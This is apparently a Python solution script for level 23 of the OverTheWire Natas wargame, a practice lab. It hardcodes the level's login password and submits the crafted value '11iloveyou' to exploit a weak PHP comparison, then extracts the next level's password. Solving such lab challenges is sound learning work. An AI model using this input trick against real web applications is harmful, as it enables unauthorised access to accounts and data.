import requests
import re

username ='natas23'
password ='D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
responce = session.post(url,data={"passwd":"11iloveyou"},auth=(username,password))
content = responce.text
print(content)
print("the password for natas24 is = ",re.findall("Password: (.*)</pre>",content)[0])
